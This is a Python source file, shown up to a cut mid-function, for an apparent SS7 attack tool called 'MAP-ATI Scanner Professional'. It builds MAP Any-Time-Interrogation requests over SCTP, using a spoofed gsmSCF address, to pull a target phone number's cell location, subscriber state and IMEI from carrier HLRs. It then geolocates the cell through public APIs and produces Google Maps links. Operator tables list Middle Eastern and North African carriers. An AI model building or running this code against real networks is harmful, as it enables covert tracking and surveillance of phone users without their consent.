#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MAP-ATI Scanner Professional v8.0 - Advanced Analysis Engine
===========================================================
Author: donex1888
Date: 2025-06-05 03:59:04 UTC
Status: Production Ready - Complete Advanced Analysis Engine
Description: Professional MAP Any-Time-Interrogation scanner with comprehensive TCAP/MAP analysis
License: Educational/Research Use Only

Enhanced Features:
- Complete TCAP/MAP analysis engine with Pycrate integration
- Advanced response parsing with full data extraction
- Professional Rich-based UI with real-time dashboard
- Comprehensive location services with Google Maps integration
- Intelligent data classification and export system
- Multi-format output with HTML reports
- Operator database and network intelligence
"""

import socket
import struct
import os
import sys
import time
import random
import logging
import threading
import argparse
import json
import csv
import asyncio
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional, List, Dict, Tuple, Any, Union, Set
from copy import deepcopy
import ipaddress

# Enhanced UI Libraries
try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.tree import Tree
    from rich.text import Text
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("⚠️  Rich not available. Install with: pip install rich")

# Location Services Libraries
try:
    import requests
    from geopy.geocoders import Nominatim
    import geocoder
    LOCATION_SERVICES_AVAILABLE = True
except ImportError:
    LOCATION_SERVICES_AVAILABLE = False
    print("⚠️  Location services not available. Install with: pip install requests geopy geocoder")

# HTML Report Generation
try:
    from jinja2 import Template
    HTML_REPORTS_AVAILABLE = True
except ImportError:
    HTML_REPORTS_AVAILABLE = False
    print("⚠️  HTML reports not available. Install with: pip install jinja2")

# ================================
# VERSION AND BUILD INFORMATION
# ================================

VERSION = "5.0"
BUILD_DATE = "2025-06-05 03:59:04 UTC"
AUTHOR = "donex1888"
STATUS = "Production Ready - Complete Advanced Analysis Engine"
SCAN_ID = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

# ================================
# ENHANCED COLOR SYSTEM
# ================================

class Colors:
    # Basic colors with Rich fallback
    if RICH_AVAILABLE:
        RESET = ''
        RED = '[red]'
        GREEN = '[green]'
        YELLOW = '[yellow]'
        BLUE = '[blue]'
        MAGENTA = '[magenta]'
        CYAN = '[cyan]'
        WHITE = '[white]'
        BRIGHT_RED = '[bright_red]'
        BRIGHT_GREEN = '[bright_green]'
        BRIGHT_YELLOW = '[bright_yellow]'
        BRIGHT_BLUE = '[bright_blue]'
        BRIGHT_CYAN = '[bright_cyan]'
        BOLD = '[bold]'
        DIM = '[dim]'
    else:
        # Fallback ANSI colors
        RESET = '\033[0m'
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        BRIGHT_RED = '\033[91m'
        BRIGHT_GREEN = '\033[92m'
        BRIGHT_YELLOW = '\033[93m'
        BRIGHT_BLUE = '\033[94m'
        BRIGHT_CYAN = '\033[96m'
        BOLD = '\033[1m'
        DIM = '\033[2m'

# ================================
# PROTOCOL CONSTANTS & ENUMS
# ================================

class MapOperations:
    """MAP Operation Codes according to 3GPP TS 29.002"""
    UPDATE_LOCATION = 2
    CANCEL_LOCATION = 3
    PURGE_MS = 67
    SEND_IDENTIFICATION = 55
    UPDATE_GPRS_LOCATION = 23
    PROVIDE_SUBSCRIBER_INFO = 70
    ANY_TIME_INTERROGATION = 71
    ANY_TIME_SUBSCRIPTION_INTERROGATION = 62
    NOTE_SUBSCRIBER_DATA_MODIFIED = 5

class SSN:
    """SubSystem Numbers according to ITU-T Q.713"""
    HLR = 149
    VLR = 150
    MSC = 151
    SGSN = 152
    GGSN = 153
    CAP = 146
    GMLC = 147
    PCAP = 148

class AtiVariant(Enum):
    """ATI Request Variants"""
    BASIC = "basic"
    LOCATION_ONLY = "location_only"
    SUBSCRIBER_STATE = "subscriber_state"
    EQUIPMENT_INFO = "equipment_info"
    ALL_INFO = "all_info"
    MINIMAL = "minimal"

class ScanResult(Enum):
    """Enhanced Scan Result Types"""
    SUCCESS = "success"
    TIMEOUT = "timeout"
    CONNECTION_REFUSED = "connection_refused"
    NETWORK_ERROR = "network_error"
    PROTOCOL_ERROR = "protocol_error"
    MAP_ERROR = "map_error"
    BUILD_ERROR = "build_error"
    TCAP_ANALYSIS_ERROR = "tcap_analysis_error"
    MAP_ANALYSIS_ERROR = "map_analysis_error"
    UNKNOWN_ERROR = "unknown_error"

# ================================
# OPERATOR DATABASE
# ================================

OPERATOR_DATABASE = {
    # Egypt - مصر
    "602": {
        "01": {"name": "Vodafone Egypt", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Egypt"},
        "02": {"name": "Orange Egypt", "technology": ["GSM", "UMTS", "LTE"], "country": "Egypt"},
        "03": {"name": "Etisalat Misr", "technology": ["GSM", "UMTS", "LTE"], "country": "Egypt"},
        "04": {"name": "WE (Telecom Egypt)", "technology": ["LTE", "5G"], "country": "Egypt"}
    },
    # Saudi Arabia - السعودية
    "420": {
        "01": {"name": "STC Saudi Arabia", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Saudi Arabia"},
        "03": {"name": "Mobily", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Saudi Arabia"},
        "04": {"name": "Zain KSA", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Saudi Arabia"},
        "07": {"name": "Virgin Mobile Saudi Arabia", "technology": ["LTE", "5G"], "country": "Saudi Arabia"}
    },
    # UAE - الإمارات
    "424": {
        "02": {"name": "Etisalat UAE", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "UAE"},
        "03": {"name": "du UAE", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "UAE"}
    },
    # Morocco - المغرب
    "604": {
        "00": {"name": "Meditel Morocco", "technology": ["GSM", "UMTS", "LTE"], "country": "Morocco"},
        "01": {"name": "IAM Morocco", "technology": ["GSM", "UMTS", "LTE"], "country": "Morocco"},
        "02": {"name": "Orange Morocco", "technology": ["GSM", "UMTS", "LTE"], "country": "Morocco"}
    },
    # Algeria - الجزائر
    "603": {
        "01": {"name": "Mobilis Algeria", "technology": ["GSM", "UMTS", "LTE"], "country": "Algeria"},
        "02": {"name": "Djezzy Algeria", "technology": ["GSM", "UMTS", "LTE"], "country": "Algeria"},
        "03": {"name": "Ooredoo Algeria", "technology": ["GSM", "UMTS", "LTE"], "country": "Algeria"}
    },
    # Tunisia - تونس
    "605": {
        "01": {"name": "Orange Tunisia", "technology": ["GSM", "UMTS", "LTE"], "country": "Tunisia"},
        "02": {"name": "Tunisie Telecom", "technology": ["GSM", "UMTS", "LTE"], "country": "Tunisia"},
        "03": {"name": "Ooredoo Tunisia", "technology": ["GSM", "UMTS", "LTE"], "country": "Tunisia"}
    },
    # Jordan - الأردن
    "416": {
        "01": {"name": "Zain Jordan", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Jordan"},
        "02": {"name": "Xpress Jordan", "technology": ["GSM", "UMTS"], "country": "Jordan"},
        "03": {"name": "Umniah Jordan", "technology": ["GSM", "UMTS", "LTE"], "country": "Jordan"},
        "77": {"name": "Orange Jordan", "technology": ["GSM", "UMTS", "LTE"], "country": "Jordan"}
    },
    # Iraq - العراق
    "418": {
        "05": {"name": "Asia Cell Iraq", "technology": ["GSM", "UMTS", "LTE"], "country": "Iraq"},
        "08": {"name": "SanaTel Iraq", "technology": ["GSM"], "country": "Iraq"},
        "20": {"name": "Zain Iraq", "technology": ["GSM", "UMTS", "LTE"], "country": "Iraq"},
        "30": {"name": "Iraqna Iraq", "technology": ["GSM", "UMTS"], "country": "Iraq"},
        "40": {"name": "Korek Iraq", "technology": ["GSM", "UMTS", "LTE"], "country": "Iraq"}
    },
    # Palestine - فلسطين
    "425": {
        "01": {"name": "Palestine Cellular Communications", "technology": ["GSM", "UMTS", "LTE"], "country": "Palestine"},
        "05": {"name": "Paltel Palestine", "technology": ["GSM", "UMTS"], "country": "Palestine"},
        "06": {"name": "Wataniya Palestine", "technology": ["GSM", "UMTS", "LTE"], "country": "Palestine"}
    },
    # Lebanon - لبنان  
    "415": {
        "01": {"name": "MIC 1 Lebanon", "technology": ["GSM", "UMTS", "LTE"], "country": "Lebanon"},
        "03": {"name": "MIC 2 Lebanon", "technology": ["GSM", "UMTS", "LTE"], "country": "Lebanon"}
    },
    # Syria - سوريا
    "417": {
        "01": {"name": "Syriatel", "technology": ["GSM", "UMTS", "LTE"], "country": "Syria"},
        "02": {"name": "MTN Syria", "technology": ["GSM", "UMTS"], "country": "Syria"},
        "09": {"name": "Syrian Telecom", "technology": ["GSM", "UMTS"], "country": "Syria"}
    }
}

COUNTRY_CODES = {
    "602": "Egypt", "420": "Saudi Arabia", "424": "UAE", "604": "Morocco",
    "603": "Algeria", "605": "Tunisia", "416": "Jordan", "418": "Iraq",
    "425": "Palestine", "415": "Lebanon", "417": "Syria"
}

# ================================
# ENHANCED DATA STRUCTURES
# ================================

@dataclass
class LocationInfo:
    """Enhanced location information structure"""
    mcc: str = ""
    mnc: str = ""
    lac: int = 0
    cell_id: int = 0
    coordinates: Optional[Tuple[float, float]] = None
    address: str = ""
    country: str = ""
    city: str = ""
    operator_name: str = ""
    technology: List[str] = field(default_factory=list)
    google_maps_url: str = ""
    location_accuracy: str = "unknown"
    data_sources: List[str] = field(default_factory=list)
    vlr_number: str = ""
    msc_number: str = ""
    age_of_location: Optional[int] = None
    raw_cgi: str = ""

@dataclass
class SubscriberInfo:
    """Enhanced subscriber information structure"""
    imsi: str = ""
    msisdn: str = ""
    subscriber_state: str = ""
    equipment_status: str = ""
    imei: str = ""
    hlr_number: str = ""
    subscription_data: Dict[str, Any] = field(default_factory=dict)
    camel_data: Dict[str, Any] = field(default_factory=dict)

@dataclass
class TcapAnalysis:
    """TCAP analysis results"""
    message_type: str = ""
    transaction_id: str = ""
    components: List[Dict[str, Any]] = field(default_factory=list)
    dialogue_portion: Dict[str, Any] = field(default_factory=dict)
    application_context: str = ""
    protocol_version: int = 0
    user_information: Dict[str, Any] = field(default_factory=dict)
    raw_structure: Dict[str, Any] = field(default_factory=dict)
    analysis_success: bool = False
    error_message: str = ""

@dataclass
class MapAnalysis:
    """MAP analysis results"""
    operation_code: Optional[int] = None
    parameter_analysis: Dict[str, Any] = field(default_factory=dict)
    result_analysis: Dict[str, Any] = field(default_factory=dict)
    error_analysis: Dict[str, Any] = field(default_factory=dict)
    extracted_data: Dict[str, Any] = field(default_factory=dict)
    analysis_success: bool = False
    error_message: str = ""

@dataclass
class TargetInfo:
    """Enhanced target information structure"""
    ip: str
    port: int
    msisdn: str
    description: str = ""
    network_info: Dict[str, Any] = field(default_factory=dict)
    
    def __str__(self):
        return f"{self.ip}:{self.port} -> {self.msisdn}"

@dataclass 
class EnhancedScanResult:
    """Complete enhanced scan result structure"""
    # Basic information
    target: TargetInfo
    result: ScanResult
    timestamp: str
    scan_id: str
    unique_id: str
    
    # Response data
    response_time_ms: float = 0.0
    response_data: Optional[bytes] = None
    response_hex: str = ""
    message_size: int = 0
    
    # Error information
    error_message: str = ""
    map_error_code: Optional[int] = None
    map_error_message: str = ""
    
    # Protocol analysis
    tcap_analysis: TcapAnalysis = field(default_factory=TcapAnalysis)
    map_analysis: MapAnalysis = field(default_factory=MapAnalysis)
    
    # Extracted information
    location_info: LocationInfo = field(default_factory=LocationInfo)
    subscriber_info: SubscriberInfo = field(default_factory=SubscriberInfo)
    
    # Technical details
    ati_variant: str = ""
    otid: str = ""
    invoke_id: Optional[int] = None
    
    # Additional metadata
    additional_info: Dict[str, Any] = field(default_factory=dict)
    diagnostic_info: Dict[str, Any] = field(default_factory=dict)

# ================================
# DEPENDENCY LOADING WITH ENHANCED VERIFICATION
# ================================

def print_professional_banner():
    """Print enhanced professional banner"""
    if RICH_AVAILABLE:
        console = Console()
        
        banner_text = f"""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                    🎯 MAP-ATI SCANNER PROFESSIONAL v{VERSION}                            ║
║                         ADVANCED ANALYSIS ENGINE                                       ║
╠═══════════════════════════════════════════════════════════════════════════════════════╣
║  📅 Build: {BUILD_DATE}                                              ║
║  👤 Author: {AUTHOR}                                                          ║
║  🏗️  Status: {STATUS}                    ║
║  🆔 Scan ID: {SCAN_ID}                                               ║
╠═══════════════════════════════════════════════════════════════════════════════════════╣
║  🔧 Enhanced Features:                                                                 ║
║     • Complete TCAP/MAP Analysis Engine     • Google Maps Integration                ║
║     • Professional Rich UI Dashboard       • Multi-format Export System             ║
║     • Operator Intelligence Database       • Real-time Location Services           ║
║     • Advanced Error Analysis             • Comprehensive HTML Reports              ║
╠═══════════════════════════════════════════════════════════════════════════════════════╣
║                     Professional Cellular Analysis Tool    
╚═══════════════════════════════════════════════════════════════════════════════════════╝
        """
        
        console.print(Panel(
            banner_text,
            style="bold cyan",
            box=box.DOUBLE_EDGE
        ))
    else:
        # Fallback ASCII banner
        print(f"""
{'='*90}
🎯 MAP-ATI SCANNER PROFESSIONAL v{VERSION} - ADVANCED ANALYSIS ENGINE
{'='*90}
📅 Build: {BUILD_DATE}
👤 Author: {AUTHOR}
🏗️ Status: {STATUS}
🆔 Scan ID: {SCAN_ID}
{'='*90}
""")

# Enhanced dependency verification
print_professional_banner()

if RICH_AVAILABLE:
    console = Console()
    console.print("🔧 [yellow]Loading and verifying enhanced modules...[/yellow]")
else:
    print("🔧 Loading and verifying enhanced modules...")

# Global module variables
PYCRATE_AVAILABLE = False
MAP_MODULE = None
MAP_MS = None
TCAP_MSGS = None
SCCP_MODULE = None
SCTP_AVAILABLE = False

# Enhanced Pycrate loading with detailed verification
try:
    if RICH_AVAILABLE:
        console.print("📦 [cyan]Loading pycrate ASN.1 modules...[/cyan]")
    else:
        print("📦 Loading pycrate ASN.1 modules...")
    
    # Load MAP from TCAP_MAPv2v3
    from pycrate_asn1dir import TCAP_MAPv2v3
    MAP_MODULE = TCAP_MAPv2v3
    MAP_MS = MAP_MODULE.MAP_MS_DataTypes
    
    # Verify critical MAP components
    required_map_components = [
        'AnyTimeInterrogationArg', 'AnyTimeInterrogationRes',
        'LocationInformation', 'SubscriberInfo'
    ]
    
    for component in required_map_components:
        if hasattr(MAP_MS, component):
            if RICH_AVAILABLE:
                console.print(f"  ✅ [green]{component} verified[/green]")
            else:
                print(f"  ✅ {component} verified")
        else:
            raise ImportError(f"{component} not found in MAP_MS_DataTypes")
    
    # Load TCAP from TCAP2
    from pycrate_asn1dir import TCAP2
    TCAP_MSGS = TCAP2.TCAPMessages
    
    # Verify TCAP components
    required_tcap = ['Invoke', 'Component', 'Begin', 'End', 'Continue', 'Abort', 'TCMessage']
    for component in required_tcap:
        if hasattr(TCAP_MSGS, component):
            if RICH_AVAILABLE:
                console.print(f"  ✅ [green]{component} verified[/green]")
            else:
                print(f"  ✅ {component} verified")
        else:
            raise ImportError(f"{component} not found in TCAPMessages")
    
    # Load SCCP
    from pycrate_mobile import SCCP
    SCCP_MODULE = SCCP
    
    # Load additional MAP modules for enhanced analysis
    from pycrate_mobile import TS29002_MAPIE as MAPIE
    
    PYCRATE_AVAILABLE = True
    if RICH_AVAILABLE:
        console.print("✅ [bright_green]All pycrate modules loaded and verified[/bright_green]")
    else:
        print("✅ All pycrate modules loaded and verified")
    
except ImportError as e:
    if RICH_AVAILABLE:
        console.print(f"❌ [red]Pycrate import failed: {e}[/red]")
        console.print("📋 [yellow]Install with: pip install pycrate pycrate-asn1rt pycrate-asn1dir pycrate-mobile[/yellow]")
    else:
        print(f"❌ Pycrate import failed: {e}")
        print("📋 Install with: pip install pycrate pycrate-asn1rt pycrate-asn1dir pycrate-mobile")
    PYCRATE_AVAILABLE = False

# Enhanced SCTP verification
try:
    if RICH_AVAILABLE:
        console.print("📦 [cyan]Loading SCTP support...[/cyan]")
    else:
        print("📦 Loading SCTP support...")
    
    import sctp
    
    # Verify SCTP functionality
    test_sock = sctp.sctpsocket_tcp(socket.AF_INET)
    test_sock.close()
    
    SCTP_AVAILABLE = True
    if RICH_AVAILABLE:
        console.print("✅ [green]SCTP support loaded and verified[/green]")
    else:
        print("✅ SCTP support loaded and verified")
    
except ImportError:
    if RICH_AVAILABLE:
        console.print("❌ [red]SCTP support not available[/red]")
        console.print("📋 [yellow]Install with: pip install pysctp[/yellow]")
    else:
        print("❌ SCTP support not available")
        print("📋 Install with: pip install pysctp")
    SCTP_AVAILABLE = False
except Exception as e:
    if RICH_AVAILABLE:
        console.print(f"❌ [red]SCTP verification failed: {e}[/red]")
    else:
        print(f"❌ SCTP verification failed: {e}")
    SCTP_AVAILABLE = False

# Final dependency check
if not PYCRATE_AVAILABLE or not SCTP_AVAILABLE:
    if RICH_AVAILABLE:
        console.print("❌ [red]Critical dependencies missing. Cannot continue.[/red]")
    else:
        print("❌ Critical dependencies missing. Cannot continue.")
    sys.exit(1)

if RICH_AVAILABLE:
    console.print("🎉 [bright_green]All dependencies verified successfully![/bright_green]")
    console.print("─" * 90)
else:
    print("🎉 All dependencies verified successfully!")
    print("─" * 90)

# ================================
# ENHANCED LOGGING SYSTEM
# ================================

class ProfessionalFormatter(logging.Formatter):
    """Professional formatter with enhanced styling"""
    
    FORMATS = {
        logging.DEBUG: "%(asctime)s [DBG] %(name)s: %(message)s",
        logging.INFO: "%(asctime)s [INF] %(name)s: %(message)s",
        logging.WARNING: "%(asctime)s [WRN] %(name)s: %(message)s",
        logging.ERROR: "%(asctime)s [ERR] %(name)s: %(message)s",
        logging.CRITICAL: "%(asctime)s [CRT] %(name)s: %(message)s"
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno, self.FORMATS[logging.INFO])
        formatter = logging.Formatter(log_fmt, datefmt='%H:%M:%S')
        return formatter.format(record)

def setup_professional_logging(level: str = "INFO", log_file: Optional[str] = None) -> logging.Logger:
    """Setup professional logging system"""
    logger = logging.getLogger('MAP_ATI_Professional')
    logger.setLevel(getattr(logging, level.upper()))
    
    # Clear existing handlers
    logger.handlers.clear()
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(ProfessionalFormatter())
    logger.addHandler(console_handler)
    
    # File handler if specified
    if log_file:
        # Create logs directory
        log_path = Path(log_file)
        log_path.parent.mkdir(parents=True, exist_ok=True)
        
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s [%(levelname)s] %(name)s: %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        ))
        logger.addHandler(file_handler)
        logger.info(f"Professional logging initialized: {log_file}")
    
    return logger

# Initialize logger
logger = setup_professional_logging()

# ================================
# OPERATOR AND LOCATION INTELLIGENCE
# ================================

def lookup_operator_info(mcc: str, mnc: str) -> Dict[str, Any]:
    """Enhanced operator lookup with comprehensive information"""
    try:
        if mcc in OPERATOR_DATABASE and mnc in OPERATOR_DATABASE[mcc]:
            operator_info = OPERATOR_DATABASE[mcc][mnc].copy()
            operator_info.update({
                'mcc': mcc,
                'mnc': mnc,
                'plmn_id': f"{mcc}{mnc}",
                'country_code': mcc,
                'is_known': True
            })
            return operator_info
        
        # Fallback for unknown operators
        country = COUNTRY_CODES.get(mcc, "Unknown Country")
        return {
            'mcc': mcc,
            'mnc': mnc,
            'name': f'Unknown Operator ({mcc}-{mnc})',
            'country': country,
            'technology': ['Unknown'],
            'plmn_id': f"{mcc}{mnc}",
            'country_code': mcc,
            'is_known': False
        }
        
    except Exception as e:
        logger.error(f"Operator lookup failed for {mcc}-{mnc}: {e}")
        return {
            'mcc': mcc,
            'mnc': mnc,
            'name': 'Lookup Failed',
            'country': 'Unknown',
            'technology': ['Unknown'],
            'error': str(e),
            'is_known': False
        }

def query_opencellid(mcc: str, mnc: str, lac: int, cell_id: int) -> Optional[Tuple[float, float]]:
    """Query OpenCellID database for cell location"""
    if not LOCATION_SERVICES_AVAILABLE:
        return None
    
    try:
        # OpenCellID API endpoint (requires API key for production use)
        url = "https://us1.unwiredlabs.com/v2/process.php"
        
        # Note: In production, you would need a proper API key
        payload = {
            "token": "your_opencellid_token",  # Replace with actual token
            "radio": "gsm",
            "mcc": int(mcc),
            "mnc": int(mnc),
            "cells": [{
                "lac": lac,
                "cid": cell_id
            }]
        }
        
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'ok' and 'lat' in data and 'lon' in data:
                return (float(data['lat']), float(data['lon']))
    
    except Exception as e:
        logger.debug(f"OpenCellID query failed: {e}")
    
    return None

def query_mozilla_location(mcc: str, mnc: str, lac: int, cell_id: int) -> Optional[Tuple[float, float]]:
    """Query Mozilla Location Services for cell location"""
    if not LOCATION_SERVICES_AVAILABLE:
        return None
    
    try:
        # Mozilla Location Service API
        url = "https://location.services.mozilla.com/v1/geolocate?key=test"
        
        payload = {
            "cellTowers": [{
                "mobileCountryCode": int(mcc),
                "mobileNetworkCode": int(mnc),
                "locationAreaCode": lac,
                "cellId": cell_id
            }]
        }
        
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'location' in data:
                location = data['location']
                return (float(location['lat']), float(location['lng']))
    
    except Exception as e:
        logger.debug(f"Mozilla location query failed: {e}")
    
    return None

def estimate_location_from_lac(mcc: str, mnc: str, lac: int) -> Optional[Tuple[float, float]]:
    """Estimate approximate location based on LAC and operator knowledge"""
    try:
        # Basic geographical estimates for major operators
        # This is a simplified approach - in production you'd use more sophisticated methods
        
        operator_info = lookup_operator_info(mcc, mnc)
        country = operator_info.get('country', '').lower()
        
        # Very basic country center coordinates (for demonstration)
        country_centers = {
            'egypt': (26.8206, 30.8025),
            'saudi arabia': (23.8859, 45.0792),
            'uae': (23.4241, 53.8478),
            'morocco': (31.7917, -7.0926),
            'algeria': (28.0339, 1.6596),
            'tunisia': (33.8869, 9.5375),
            'jordan': (30.5852, 36.2384),
            'iraq': (33.2232, 43.6793),
            'palestine': (31.9522, 35.2332),
            'lebanon': (33.8547, 35.8623),
            'syria': (34.8021, 38.9968)
        }
        
        if country in country_centers:
            # Add some random offset based on LAC for variation
            base_lat, base_lon = country_centers[country]
            lat_offset = (lac % 100 - 50) * 0.01  # Small random offset
            lon_offset = ((lac * 7) % 100 - 50) * 0.01
            
            return (base_lat + lat_offset, base_lon + lon_offset)
    
    except Exception as e:
        logger.debug(f"LAC-based location estimation failed: {e}")
    
    return None

def generate_enhanced_location_data(mcc: str, mnc: str, lac: int, cell_id: int, unique_id: str) -> LocationInfo:
    """Generate comprehensive location data with multiple sources"""
    location_info = LocationInfo(
        mcc=mcc,
        mnc=mnc,
        lac=lac,
        cell_id=cell_id,
        raw_cgi=f"{mcc}-{mnc}-{lac:04X}-{cell_id:04X}"
    )
    
    try:
        # Get operator information
        operator_info = lookup_operator_info(mcc, mnc)
        location_info.operator_name = operator_info.get('name', 'Unknown')
        location_info.technology = operator_info.get('technology', [])
        location_info.country = operator_info.get('country', 'Unknown')
        
        # Try to get coordinates from various sources
        coordinates = None
        
        # Source 1: OpenCellID
        if LOCATION_SERVICES_AVAILABLE:
            coordinates = query_opencellid(mcc, mnc, lac, cell_id)
            if coordinates:
                location_info.data_sources.append('OpenCellID')
                location_info.location_accuracy = 'high'
        
        # Source 2: Mozilla Location Services
        if not coordinates and LOCATION_SERVICES_AVAILABLE:
            coordinates = query_mozilla_location(mcc, mnc, lac, cell_id)
            if coordinates:
                location_info.data_sources.append('Mozilla')
                location_info.location_accuracy = 'medium'
        
        # Source 3: LAC-based estimation
        if not coordinates:
            coordinates = estimate_location_from_lac(mcc, mnc, lac)
            if coordinates:
                location_info.data_sources.append('LAC_Estimation')
                location_info.location_accuracy = 'low'
        
        # Process coordinates if found
        if coordinates:
            lat, lon = coordinates
            location_info.coordinates = coordinates
            location_info.google_maps_url = f"https://maps.google.com/?q={lat},{lon}"
            
            # Get address information using reverse geocoding
            if LOCATION_SERVICES_AVAILABLE:
                try:
                    geolocator = Nominatim(user_agent=f"map_ati_scanner_{unique_id}")
                    location = geolocator.reverse(f"{lat}, {lon}", timeout=5)
                    if location:
                        location_info.address = location.address
                        address_parts = location.raw.get('address', {})
                        location_info.city = (
                            address_parts.get('city') or 
                            address_parts.get('town') or 
                            address_parts.get('village') or 
                            'Unknown City'
                        )
                        if not location_info.country or location_info.country == 'Unknown':
                            location_info.country = address_parts.get('country', 'Unknown')
                
                except Exception as e:
                    logger.debug(f"[{unique_id}] Reverse geocoding failed: {e}")
        
        logger.debug(f"[{unique_id}] Location data generated: {location_info.operator_name} in {location_info.country}")
        
    except Exception as e:
        logger.error(f"[{unique_id}] Enhanced location data generation failed: {e}")
    
    return location_info

# ================================
# ENHANCED PROTOCOL ANALYSIS ENGINE
# ================================

def decode_mcc_mnc_from_bcd(bcd_bytes: bytes) -> Tuple[str, str]:
    """Decode MCC/MNC from BCD format according to 3GPP TS 24.008"""
    try:
        if len(bcd_bytes) < 3:
            return "000", "00"
        
        # BCD decoding for MCC/MNC (3 bytes)
        # Byte 0: MCC digit 2 | MCC digit 1
        # Byte 1: MNC digit 3 | MCC digit 3  
        # Byte 2: MNC digit 2 | MNC digit 1
        
        mcc_digit1 = bcd_bytes[0] & 0x0F
        mcc_digit2 = (bcd_bytes[0] & 0xF0) >> 4
        mcc_digit3 = bcd_bytes[1] & 0x0F
        
        mnc_digit3 = (bcd_bytes[1] & 0xF0) >> 4
        mnc_digit1 = bcd_bytes[2] & 0x0F
        mnc_digit2 = (bcd_bytes[2] & 0xF0) >> 4
        
        mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
        
        # Check if MNC is 2 or 3 digits
        if mnc_digit3 == 0xF:
            mnc = f"{mnc_digit1}{mnc_digit2:01d}"
        else:
            mnc = f"{mnc_digit3}{mnc_digit1}{mnc_digit2}"
        
        return mcc, mnc
        
    except Exception as e:
        logger.error(f"MCC/MNC BCD decoding failed: {e}")
        return "000", "00"

def format_msisdn_professional(msisdn: str, nai_byte: int = 0x91) -> bytes:
    """Professional MSISDN formatting with enhanced validation"""
    if not msisdn:
        raise ValueError("MSISDN cannot be empty")
    
    # Clean MSISDN - remove all non-digit characters
    digits = ''.join(c for c in msisdn if c.isdigit())
    
    if not digits:
        raise ValueError("MSISDN must contain digits")
    
    # Enhanced validation for E.164 standard
    if len(digits) < 7:
        raise ValueError(f"MSISDN too short: {len(digits)} digits (minimum 7)")
    if len(digits) > 15:
        raise ValueError(f"MSISDN too long: {len(digits)} digits (maximum 15)")
    
    # BCD encoding with proper nibble swapping according to ITU-T Q.713
    if len(digits) % 2:
        digits += "F"  # Padding for odd length
    
    bcd_bytes = bytearray([nai_byte])  # Nature of Address
    
    for i in range(0, len(digits), 2):
        digit1 = int(digits[i])
        digit2 = int(digits[i+1]) if digits[i+1] != 'F' else 0xF
        
        # Pack as: high_nibble = digit2, low_nibble = digit1
        bcd_bytes.append((digit2 << 4) | digit1)
    
    return bytes(bcd_bytes)

def build_ati_pdu_professional(target_msisdn: str, ati_variant: AtiVariant = AtiVariant.BASIC,
                              cgpa_gt: str = "212600000001", unique_id: str = "") -> Tuple[Optional[bytes], Optional[str], Optional[int]]:
    """Professional ATI PDU builder with enhanced error handling and logging"""
    
    if not PYCRATE_AVAILABLE or not MAP_MS or not TCAP_MSGS:
        logger.error(f"[{unique_id}] Required pycrate modules not available")
        return None, None, None
    
    try:
        logger.debug(f"[{unique_id}] Building professional ATI PDU for {target_msisdn} (variant: {ati_variant.value})")
        
        # Create ATI instance using verified deepcopy method
        ati_arg = deepcopy(MAP_MS.AnyTimeInterrogationArg)
        
        if ati_arg is None:
            logger.error(f"[{unique_id}] Failed to create ATI instance")
            return None, None, None
        
        # Enhanced MSISDN encoding with validation
        try:
            target_msisdn_bytes = format_msisdn_professional(target_msisdn)
            scf_msisdn_bytes = format_msisdn_professional(cgpa_gt)
        except ValueError as e:
            logger.error(f"[{unique_id}] MSISDN encoding failed: {e}")
            return None, None, None
        
        logger.debug(f"[{unique_id}] Target MSISDN encoded: {target_msisdn_bytes.hex()}")
        logger.debug(f"[{unique_id}] SCF MSISDN encoded: {scf_msisdn_bytes.hex()}")
        
        # Build RequestedInfo based on ATI variant with enhanced options
        requested_info_dict = {}
        
        if ati_variant == AtiVariant.LOCATION_ONLY:
            requested_info_dict = {
                'locationInformation': None,
                'currentLocationRetrieved': None
            }
        elif ati_variant == AtiVariant.SUBSCRIBER_STATE:
            requested_info_dict = {
                'subscriberState': None,
                'requestedCAMEL-SubscriptionInfo': ('o-CSI', None)
            }
        elif ati_variant == AtiVariant.EQUIPMENT_INFO:
            requested_info_dict = {
                'equipmentStatus': None,
                'imei': None
            }
        elif ati_variant == AtiVariant.ALL_INFO:
            requested_info_dict = {
                'locationInformation': None,
                'subscriberState': None,
                'currentLocationRetrieved': None,
                'equipmentStatus': None,
                'imei': None,
                'requestedCAMEL-SubscriptionInfo': ('o-CSI', None)
            }
        elif ati_variant == AtiVariant.MINIMAL:
            requested_info_dict = {}
        else:  # BASIC
            requested_info_dict = {
                'locationInformation': None,
                'subscriberState': None
            }
        
        # Build complete ATI arguments with all fields
        ati_complete = {
            'subscriberIdentity': ('msisdn', target_msisdn_bytes),
            'requestedInfo': requested_info_dict,
            'gsmSCF-Address': scf_msisdn_bytes
        }
        
        # Enhanced ATI argument setting with multiple fallback methods
        success = False
        method_used = ""
        
        # Method 1: Complete setting with all fields
        try:
            ati_arg.set_val(ati_complete)
            success = True
            method_used = "complete_professional"
            logger.debug(f"[{unique_id}] ATI arguments set using complete professional method")
        except Exception as e1:
